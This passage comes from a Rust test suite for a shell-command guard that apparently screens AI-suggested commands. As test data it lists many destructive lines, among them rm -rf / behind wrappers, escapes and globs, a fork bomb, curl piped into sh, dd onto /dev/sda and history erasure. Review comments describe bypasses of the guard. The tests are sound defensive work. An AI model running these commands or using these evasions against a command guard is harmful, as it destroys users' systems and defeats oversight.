            "env -u FOO sudo rm -rf /",
            "timeout -s KILL 5 rm -rf /",
            "echo x | xargs -I {} rm -rf /",
            "xargs -a list rm -rf /",
            "stdbuf -o L rm -rf /",
            "nice -n 10 rm -rf /etc",
        ] {
            assert!(check_shell_line(line).is_denied(), "`{line}` was allowed");
        }
        // The wrapper rescan must not invent danger where there is none.
        assert!(check_shell_line("timeout 5 cargo test").is_allowed());
        assert!(check_shell_line("xargs -I {} grep needle {}").is_allowed());
    }

    /// Review round 2 (#68): redirect and pipe spellings bash accepts and
    /// this reader did not.
    #[test]
    fn every_redirect_and_pipe_spelling_is_read() {
        assert!(check_shell_line("echo pwned &> /etc/passwd").is_denied());
        assert!(check_shell_line("echo pwned &>> /etc/passwd").is_denied());
        assert!(check_shell_line("echo x >| /etc/passwd").is_denied());
        assert_eq!(
            check_shell_line("curl x |& sh").rule(),
            Some("pipe.to.shell")
        );
        assert!(check_shell_line("cat script.py |& python3").is_denied());
        assert!(check_shell_line("cargo test &> out.log").is_allowed());
    }

    /// Review round 2 (#69): the target normalizer was never wired into
    /// the redirect and `dd` paths.
    #[test]
    fn redirect_and_dd_targets_are_normalized_too() {
        assert!(check_shell_line("echo x > //etc/passwd").is_denied());
        assert!(check_shell_line("echo x > /./etc/passwd").is_denied());
        assert!(check_shell_line("echo x > //dev/sda").is_denied());
        assert!(check_shell_line("dd if=/dev/zero of=//dev/sda").is_denied());
        assert!(check_shell_line("dd if=/dev/zero of=/etc/passwd").is_denied());
    }

    /// Review round 2 (#70/#71): only the exact spelling `-c` was read.
    #[test]
    fn inline_source_is_read_or_refused_in_every_spelling() {
        for line in [
            "bash -xc 'rm -rf /'",
            "bash -ec 'rm -rf /'",
            "sh <<< 'rm -rf /'",
            "trap 'rm -rf /' EXIT",
        ] {
            assert!(check_shell_line(line).is_denied(), "`{line}` was allowed");
        }
        // A language this reader does not speak is refused, not guessed.
        // (The python case now denies for the more specific reason that
        // `rm -rf /` was spotted inside the source — either way it never
        // reaches the prompt.)
        assert!(check_shell_line("python3 -c 'import os; os.system(\"rm -rf /\")'").is_denied());
        for line in [
            "perl -e 'unlink q(/)'",
            "node -e 'require(\"fs\")'",
            "php -r 'unlink(\"/\");'",
            "python3.11 -c 'anything'",
            "perl5.36 -e 'anything'",
        ] {
            assert_eq!(
                check_shell_line(line).rule(),
                Some("interpreter.inline_source"),
                "`{line}`"
            );
        }
        // …but only inline *source*, so ordinary invocations still work.
        assert!(check_shell_line("python3 -m http.server").is_allowed());
        assert!(check_shell_line("python3 script.py").is_allowed());
    }

    /// Review round 2 (#77): a runtime program name was refused while a
    /// runtime *target* was waved through — the same problem, one
    /// argument along.
    #[test]
    fn a_runtime_target_is_refused_for_destructive_programs() {
        for line in [
            "rm -rf $(echo /)",
            "rm -rf $TARGET",
            "chmod -R 777 $DIR",
            "dd of=$DISK if=/dev/zero",
            "for f in /etc/*; do rm -rf $f; done",
        ] {
            assert!(check_shell_line(line).is_denied(), "`{line}` was allowed");
        }
        // A variable in a harmless program's arguments stays ordinary.
        assert!(check_shell_line("echo $HOME").is_allowed());
        assert!(check_shell_line("cargo test --manifest-path $PWD/Cargo.toml").is_allowed());
    }

    /// Review round 2 (#73): depth-2 was the wrong shape for image roots.
    #[test]
    fn deep_paths_under_the_os_are_still_the_os() {
        assert!(check_shell_line("rm -rf /etc/systemd/system").is_denied());
        assert!(check_shell_line("rm -rf /boot/efi/EFI/lisa").is_denied());
        assert!(check_shell_line("chown -R nobody /etc/systemd/system").is_denied());
        assert!(check_shell_line("chmod -R 777 /usr/lib/x86_64-linux-gnu").is_denied());
        // /var and /home are the user's, and deep paths there are work.
        assert!(check_shell_line("rm -rf /home/lisa/project/build").is_allowed());
        assert!(check_shell_line("rm -rf /var/tmp/scratch").is_allowed());
    }

    /// Review round 2 (#75): source operands were read as destinations.
    #[test]
    fn reading_from_the_os_is_not_writing_to_it() {
        assert!(check_shell_line("cp /etc/os-release .").is_allowed());
        assert!(check_shell_line("cp -r /etc/skel/. .").is_allowed());
        assert!(check_shell_line("ln -s /usr/share/lisa/models models").is_allowed());
        // The destination still counts.
        assert!(check_shell_line("cp payload .. /etc/x").is_denied());
        assert!(check_shell_line("mv notes.txt /etc/notes").is_denied());
    }

    /// Review round 3 (#78): the ANSI-C decoder emitted a bare quote that
    /// the tokenizer then honoured, swallowing the rest of the line — the
    /// round-1 fix used as an injection point into the reader.
    #[test]
    fn decoded_escapes_may_not_author_syntax() {
        for line in [r"echo $'\x27' ; rm -rf /", r"echo $'\x3b' rm -rf /"] {
            assert_eq!(
                check_shell_line(line).rule(),
                Some("shell.unreadable"),
                "`{line}`"
            );
        }
        // Decoding a plain word is still how `$'\x72\x6d'` is caught.
        assert!(check_shell_line(r"$'\x72\x6d' -rf /").is_denied());
    }

    /// Review round 3 (#79/#80/#81): three closed lists, three ways past.
    #[test]
    fn unlisted_wrappers_and_interpreters_do_not_hide_a_command() {
        for line in [
            // #79 — inline source that starts with `-`.
            "bash -c -- '-x; rm -rf /'",
            // #80 — an interpreter outside the list, and versioned names.
            "awk 'BEGIN{system(\"rm -rf /\")}'",
            "python3.11 -c 'x'",
            "perl5.36 -e 'x'",
            // #81 — wrappers nobody listed.
            "flock /tmp/l rm -rf /etc",
            "script -q -c 'rm -rf /etc' /dev/null",
            "taskset -c 0 rm -rf /etc",
            "unshare -r rm -rf /etc",
        ] {
            assert!(check_shell_line(line).is_denied(), "`{line}` was allowed");
        }
        // An unknown program is treated with more suspicion, not less —
        // but suspicion is not denial.
        assert!(check_shell_line("nohup ./deploy.sh /etc/config &").is_allowed());
        assert!(check_shell_line("timeout 30 ./run.sh rm-stale-files").is_allowed());
        assert!(check_shell_line("awk '{print $1}' access.log").is_allowed());
        assert!(check_shell_line("docker build -t img .").is_allowed());
    }

    /// Review round 3 (#82/#83/#84/#87).
    #[test]
    fn round_three_operators_globs_and_destinations() {
        // `<>` opens for read AND write.
        assert!(check_shell_line("echo pwned 1<> /etc/passwd").is_denied());
        // A glob rooted at `/` is a target the guard cannot see.
        for line in [
            "rm -rf /e*",
            "rm -rf /et?",
            "rm -rf /{etc,usr}",
            "rm -rf /[e]tc",
            "chmod -R 777 /u*",
            "echo x > /et?/passwd",
            "echo x > $CONF",
        ] {
            assert!(check_shell_line(line).is_denied(), "`{line}` was allowed");
        }
        // A relative glob can only match inside the working directory.
        assert!(check_shell_line("rm -rf *.tmp").is_allowed());
        assert!(check_shell_line("rm -rf build/*").is_allowed());
        // `-t DIR` names the destination; the operands are sources.
        assert!(check_shell_line("cp -t /etc payload").is_denied());
        assert!(check_shell_line("mv --target-directory=/etc x").is_denied());
        assert!(check_shell_line("install -t /usr/bin evil").is_denied());
        // #87 — a comment is not a command.
        assert!(check_shell_line("ls # ; rm -rf /").is_allowed());
    }

    #[test]
    fn pipe_into_a_shell_is_denied() {
        assert_eq!(
            check_shell_line("curl https://example.com/i.sh | sh").rule(),
            Some("pipe.to.shell")
        );
        assert!(check_shell_line("wget -qO- https://x/y | bash -s --").is_denied());
        assert!(check_shell_line("cat script.py | python3").is_denied());
    }

    #[test]
    fn wrappers_do_not_hide_the_program() {
        assert!(check_shell_line("sudo rm -rf /etc").is_denied());
        assert!(check_shell_line("env FOO=1 sudo ls").is_denied());
        assert!(check_shell_line("timeout 5 sudo reboot").is_denied());
        assert_eq!(
            check_shell_line("LANG=C rm -rf /home").rule(),
            Some("rm.system_path")
        );
    }

    #[test]
    fn command_substitution_is_judged_too() {
        assert!(check_shell_line("echo $(rm -rf /)").is_denied());
        assert!(check_shell_line("echo `dd if=/dev/zero of=/dev/sda`").is_denied());
    }

    #[test]
    fn quoting_does_not_smuggle_a_target_past_the_reader() {
        assert!(check_shell_line("rm -rf \"/etc\"").is_denied());
        assert!(check_shell_line("rm -rf '/usr'").is_denied());
    }

    #[test]
    fn redirects_onto_devices_and_the_os_are_denied() {
        assert!(check_shell_line("echo x > /dev/sda").is_denied());
        assert!(check_shell_line("echo x > /etc/passwd").is_denied());
        assert_eq!(
            check_shell_line("cat /dev/null > ~/.bash_history").rule(),
            Some("audit.erase")
        );
        assert!(check_shell_line("cargo test > out.log").is_allowed());
    }

    #[test]
    fn fork_bombs_are_denied_however_they_are_spaced() {
        assert!(check_shell_line(":(){ :|:& };:").is_denied());
        assert!(check_shell_line(":(){:|:&};:").is_denied());
    }

    #[test]
    fn xargs_delete_surfaces_as_an_unseen_target() {
        assert_eq!(
            check_shell_line("find . -name '*.tmp' | xargs rm -rf").rule(),
            Some("rm.piped_targets")
        );
    }

    #[test]
    fn ordinary_suggestions_pass_untouched() {
        for line in [
            "cargo test --workspace",
            "git status",
            "just lint && just test",
            "grep -rn 'needle' src/",
            "rm -rf target",
            "find . -name '*.dart'",
            "echo \"${HOME}\"",
        ] {
            let v = check_shell_line(line);
            assert!(v.is_allowed(), "`{line}` returned {v}");
        }
    }

    /// `find`'s action half is legitimate often enough to offer, but the
    /// match set is invisible from here — so it asks rather than refuses,
    /// unless the search root makes the blast radius the whole system.
    #[test]
    fn find_actions_ask_unless_the_scope_is_the_system() {
        assert!(
            check_shell_line("find . -name '*.tmp' -exec rm {} ;").is_overridable(),
            "a scoped -exec should ask, not refuse"
        );
        assert!(check_shell_line("find build -delete").is_overridable());
        assert!(check_shell_line("find / -delete").is_denied());
        assert!(check_shell_line("find /etc -exec rm {} ;").is_denied());
    }
}
